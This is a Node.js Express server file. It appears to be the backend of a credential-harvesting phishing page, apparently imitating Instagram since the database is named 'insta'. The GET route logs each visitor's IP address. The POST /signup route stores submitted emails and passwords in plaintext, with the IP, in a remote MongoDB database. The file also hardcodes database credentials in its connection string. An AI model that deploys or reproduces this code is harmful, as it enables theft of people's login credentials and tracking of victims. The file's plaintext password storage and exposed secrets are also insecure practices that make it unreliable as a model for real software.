const express = require('express');
const app = express();
const ejs = require('ejs');
const mongoose = require('mongoose');
const ipware = require('ipware')().get_ip;
const port  = process.env.PORT || 5010;
const User = require('./modal/db')
const Ip = require('./modal/ip')
app.set('view engine', 'ejs')

app.use(express.urlencoded({extended: false}));

mongoose.connect("mongodb+srv://aliens:aliens@cluster0.1wwt7.mongodb.net/insta?retryWrites=true&w=majority", {
    useNewUrlParser:true,
    useUnifiedTopology:true,
    useCreateIndex:true
}).then(() => {
    console.log("Connection successful");
}
).catch((e) => {
    console.log(e);
})


app.get('/signup', async (req, res) => {
    try {
    const ipdata = await new Ip({
        ip: req.socket.remoteAddress
    })
    ipdata.save()
    res.render('home')
}
catch(e) {
    console.log(e)
}
})


app.post('/signup', async (req, res) => {
try {
    const email = req.body.email;
    const password = req.body.password;
    
    
    const data = await new User({
        ip: req.socket.remoteAddress,
        email: email,
        password: password
    })

   data.save()
    console.log('save')
    res.render('home')
}

catch(e) {
    console.log(e)
}
})



app.listen(port, (e) => {
    console.log('Server is running on port 5010');
})